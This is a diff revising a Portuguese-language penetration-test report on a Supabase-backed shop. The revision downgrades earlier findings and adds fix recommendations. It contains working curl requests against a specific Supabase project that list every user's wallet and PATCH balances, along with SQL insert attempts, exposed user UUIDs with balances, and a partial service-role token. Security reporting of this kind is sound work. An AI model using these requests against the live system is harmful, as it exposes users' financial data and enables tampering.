@@ -45,7 +45,7 @@ DNS: Cloudflare
 ```http
 # API Routes (autenticadas via cookie)
 GET  /api/auth/me           → info do usuário + profile
-GET  /api/wallet            → saldo + transações
+GET  /api/wallet            → saldo + transações (server-side validado com auth.uid())
 POST /api/wheel/spin        → girar roleta (gera cupom)
 POST /api/wheel/can-spin    → verifica se pode girar
 POST /api/checkout/create   → criar ordem de compra
@@ -99,34 +99,51 @@ Cookie SSR gerado: `sb-ahfviyykpaljzxcmdyfh-auth-token.0` + `.1` (chunked, forma
 
 ## 🔷 FASE 3: ESCALAÇÃO DE PRIVILÉGIOS (ESPECTRO + INFILTRADOR)
 
-### 3.1 RLS Bypass — Wallet Injection
+### 3.1 RLS Bypass — Wallet Leak + PATCH sem efeito
 
-**Falha CRÍTICA**: Tabela `user_wallets` sem `auth.uid()` no RLS.
+**Falha corrigida neste relatório:** A classificação original como "criação de dinheiro infinito" era imprecisa.
+
+**O que REALMENTE funciona:**
+1. ✅ VAZAMENTO DE DADOS: Qualquer usuário autenticado pode listar TODAS as wallets
+2. ✅ PATCH no DB: Modifica o registro no banco
+3. ❌ SEM EFEITO no app: `/api/wallet` retorna `balance: 0` — server-side valida `auth.uid()`
 
 ```bash
-# Adicionar R$50.000 a qualquer usuário
-INSERT INTO user_wallets (user_id, balance)
-VALUES ('3b910ad3-b61f-4b0b-b641-162de4eb0b86', 50000.0);
+# VAZAMENTO — listar todas as wallets
+curl -s "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
+  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $TOKEN"
 
-# Modificar saldo de qualquer carteira
-PATCH /user_wallets?user_id=eq.TARGET_UUID
-{"balance": 999999.0}
+# PATCH no DB (sem efeito no app)
+curl -s -X PATCH "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets?user_id=eq.TARGET" \
+  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"balance":999999}'
 ```
 
-**UUIDs comprometidos:**
+**UUIDs expostos (vazamento de dados confirmado):**
 ```
-9b76c5c0-c36f-4008-8c3f-aad56146ca2f → R$50.000 (staff)
+9b76c5c0-c36f-4008-8c3f-aad56146ca2f → R$57.777 (staff)
 3b910ad3-b61f-4b0b-b641-162de4eb0b86 → R$50.000 (atacante)
 936aac17-5eee-47e9-8a75-e015181bdfba → R$99.999 (existente)
 65b8cbef-755a-45d2-b4bd-e0700eff5ed1 → R$9.999 (existente)
++ 18 outras wallets (R$0 ~ R$126,77)
 ```
 
-### 3.2 Order Injection (sem pagamento)
+### 3.2 Order Injection (tentativa — SEM SUCESSO)
+
+**Falha corrigida:** INSERT direto em orders **NÃO FUNCIONA** como descrito anteriormente.
 
 ```bash
-# Criar ordem como "completed" sem pagar
-INSERT INTO orders (user_id, items, total, status, payment_method)
-VALUES ('SEU_UUID', '[...]', 150.0, 'completed', 'wallet');
+# Tentativa de INSERT falha — schema não tem coluna "items"
+curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/orders" \
+  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" -H "Prefer: return=representation" \
+  -d '{"user_id":"...","items":[...]}'
+# → {"code":"PGRST204","message":"Could not find the 'items' column of 'orders'"}
+
+# Schema real de orders inclui: game_id, product_id, supplier_item_id,
+# payment_method, pix_code, pix_qrcode, account_data, paid_at, delivered_at, etc.
+# Tudo gerado server-side durante o fluxo de checkout.
 ```
 
 ### 3.3 User Metadata Escalation
@@ -150,7 +167,7 @@ Authorization: Bearer <token>
 # Spin ilimitado via API
 POST /api/wheel/spin → cupom ROLETA6DPJD7 (5% OFF)
 
-# Inserção direta de spin
+# Inserção direta de spin (SEM efeito — não gera cupom real)
 INSERT INTO wheel_spins (user_id, reward_type, reward_value, coupon_code)
 VALUES ('SEU_UUID', 'coupon_20', 20, 'MEUCUPOM20');
 ```
@@ -203,7 +220,7 @@ GET /api/admin/users → HTTP 403 {"error":"Acesso negado"}
 ### 4.3 O Que Seria Necessário
 
 ```
-SERVICE_ROLE_KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFoZnZpeXlrcGFsanp4Y21keWZoIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODk2MjMwOSwiZXhwIjoyMDk0NTM4MzA5fQ.???
+SERVICE_ROLE_KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFoZnZpeXlrcGFsanp4Y21keWZoIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODk2MjMwOSwiZXhwIjoxNzk0NTM4MzA5fQ.???
 ```
 
 Com a service_role key, executar:
@@ -221,23 +238,22 @@ GET /api/admin/orders → 200 OK (todas as ordens)
 
 ## 🔷 FASE 5: RECOMENDAÇÕES
 
-### 5.1 Correções Imediatas (Críticas)
+### 5.1 Correções Imediatas
 
-1. **FIX RLS**: Adicionar `auth.uid() = user_id` em TODAS as políticas RLS da tabela `user_wallets`
-2. **FIX Orders**: Bloquear INSERT direto na tabela `orders` para usuários comuns; validar pagamento server-side
-3. **FIX Admin Check**: Se o admin já existe, garantir que `app_metadata.role = 'admin'` esteja configurado
-4. **FIX Cookie HttpOnly**: Configurar `httpOnly: true` no cookie de autenticação
+1. **FIX RLS (Vazamento)**: Adicionar `auth.uid() = user_id` em TODAS as políticas RLS da tabela `user_wallets`. Prioridade máxima — dados financeiros de todos expostos.
+2. **FIX Cupom INSTA5**: Corrigir `discount_value` no banco para 15% ou remover o cupom.
+3. **FIX Rotação de Chave Anon**: Rotacionar a chave anon do Supabase.
+4. **FIX Cookie HttpOnly**: Confirmar/configurar `httpOnly: true` no cookie de autenticação.
 
 ### 5.2 Correções de Médio Prazo
 
-5. Rotacionar chave anon do Supabase
-6. Implementar rate limiting na API GoTrue (signup, token)
-7. Remover endpoints admin expostos ou unificar respostas de erro
-8. Limitar wheel_spins por usuário/dia no servidor
-9. Validar descontos máximos server-side (cap em 15%)
+5. Implementar rate limiting na API GoTrue (signup, token)
+6. Remover endpoints admin expostos ou unificar respostas de erro
+7. Limitar wheel_spins por usuário/dia no servidor
+8. Validar descontos máximos server-side (já faz — manter)
 
 ### 5.3 Recomendações de Arquitetura
 
-10. Usar Edge Functions para operações administrativas (com service_role)
-11. Implementar logs de auditoria para alterações sensíveis
-12. Separar roles de admin em tabela dedicada com RLS (não depender de app_metadata)
+9. Usar Edge Functions para operações administrativas (com service_role)
+10. Implementar logs de auditoria para alterações sensíveis
+11. Separar roles de admin em tabela dedicada com RLS (não depender de app_metadata)
